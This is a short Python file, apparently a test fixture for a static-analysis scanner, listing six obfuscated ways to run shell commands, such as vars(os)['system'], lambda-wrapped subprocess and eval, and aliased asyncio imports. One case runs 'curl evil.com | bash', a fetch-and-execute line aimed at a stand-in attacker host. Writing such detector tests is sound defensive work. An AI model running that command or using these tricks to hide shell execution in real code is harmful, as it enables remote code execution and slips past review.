import os
import subprocess
import asyncio
import importlib

# 1. vars() dict access pattern for shell exec
vars(os)["system"]("whoami")

# 2. asyncio.create_subprocess_shell 
asyncio.create_subprocess_shell("curl evil.com | bash")

# 3. asyncio.create_subprocess_exec
asyncio.create_subprocess_exec("ls", "-la")

# 4. Lambda wrapping of subprocess call
exec_shell = lambda cmd: subprocess.call(cmd, shell=True)
exec_shell("whoami")

# 5. Lambda wrapping of eval
run_code = lambda code: eval(code)
run_code("import os")

# 6. from-import with async subprocess
from asyncio import create_subprocess_shell as start_proc
start_proc("whoami")